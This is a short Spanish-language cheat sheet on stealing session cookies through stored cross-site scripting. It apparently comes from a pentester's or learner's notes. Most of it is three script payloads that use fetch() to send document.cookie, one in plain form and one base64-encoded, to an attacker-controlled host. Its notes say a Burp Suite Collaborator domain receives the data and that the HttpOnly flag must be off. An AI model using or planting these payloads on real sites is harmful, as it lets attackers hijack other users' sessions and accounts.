# Robo de cookies mediante XSS almacenado sin sanitización 

Tags: #XSS  #JavaScript 

```javascript 
// Se debe de usar BurpSuite Collaborator para obtener el dominio 

	// PoC1
	<script>
		fetch("https://website.com/test");
	</script>


	//PoC2 para devolver la cookie de sesión 
	<script>
		fetch("https://website.com/?cookie=" + document.cookie);
	</script>


	//PoC3 para devolver la cookie de sesión en base64
	<script>
		fetch("https://website.com/?cookie=" + btoa(document.cookie));
	</script>


Notas:
	1. Con 'fetch()' es posible lanzar solicitudes GET y POST 
	2. btoa hace que el contenido lo muestre en base64 
	3. No debe de estar activada la flag 'HttpOnly'
```